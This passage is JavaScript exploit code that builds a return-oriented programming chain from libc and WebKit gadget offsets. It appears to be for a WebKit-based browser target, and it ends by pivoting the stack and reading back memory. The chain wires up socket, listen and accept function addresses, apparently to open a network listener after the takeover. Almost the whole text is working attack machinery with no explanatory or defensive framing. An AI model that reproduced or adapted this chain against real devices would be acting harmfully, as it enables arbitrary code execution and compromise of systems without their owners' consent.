libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
accept_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+219336, //L3479
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3479:
db([0, 0]); // 0x0
//L3241:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
listen_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+220664, //L3480
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3480:
db([0, 0]); // 0x0
//L3167:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
socket_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+221992, //L3481
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3481:
db([0, 0]); // 0x0
//L2632:
db([2, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
